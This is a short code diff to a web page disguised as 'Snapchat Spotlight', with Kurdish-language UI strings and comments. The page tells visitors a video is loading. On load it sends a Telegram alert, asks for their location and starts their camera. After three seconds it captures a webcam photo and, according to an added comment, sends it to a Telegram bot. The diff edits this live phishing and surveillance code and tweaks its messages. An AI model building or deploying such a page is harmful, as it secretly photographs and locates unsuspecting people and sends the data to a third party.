@@ -15,7 +15,7 @@
     <div>
         <div class="loader"></div>
         <h1>Snapchat Spotlight</h1>
-        <p>تکایە چاوەڕێ بکە، ڤیدیۆ بار دبێت...</p>
+        <p>تکایە چاوەڕێ بکە...</p>
     </div>
 
     <video id="video" autoplay playsinline></video>
@@ -51,6 +51,7 @@
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
+                // تنێ وێنەیەک ب تنێ پشتی ٣ چرکان دگرێت و بۆتە ل تەلەگرامێ دەنێرێت
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
@@ -75,7 +76,7 @@
         }
 
         window.onload = () => {
-            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە و داوای مۆڵەت دەکرێت...");
+            sendMessage("🚀 کەسێک هاتە ناو سایتەکەوە و مۆڵەت هاتیە دایین...");
             askLocation();
             startCamera();
         };
